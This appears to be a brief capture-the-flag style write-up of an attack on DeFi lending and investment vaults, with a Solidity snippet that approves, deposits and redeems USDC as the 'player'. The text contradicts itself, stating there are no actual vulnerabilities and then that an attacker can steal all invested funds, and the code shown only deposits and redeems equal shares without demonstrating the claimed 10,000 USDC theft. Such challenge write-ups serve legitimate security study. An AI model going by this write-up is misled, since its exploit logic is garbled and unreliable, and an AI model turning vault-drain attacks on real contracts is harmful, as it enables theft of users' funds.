### Vulnerabilities

No actual vulnerabilities. An attacker can steal all invested funds via an exploit in the lending contracts.

### Attack

1. Deposit 5,000 USDC into each investment vault and yoink 10,000 USDC from the idle vault by redeeming in the same transaction:
```solidity
        /// INVESTMENT ATTACK
        usdc.approve(address(investmentVaults[0]), type(uint256).max);
        usdc.approve(address(investmentVaults[1]), type(uint256).max);
        uint256 s1 = investmentVaults[0].deposit(5_000e6, player);
        uint256 s2 = investmentVaults[1].deposit(5_000e6, player);
        investmentVaults[0].redeem(s1, player, player);
        investmentVaults[1].redeem(s2, player, player);
```
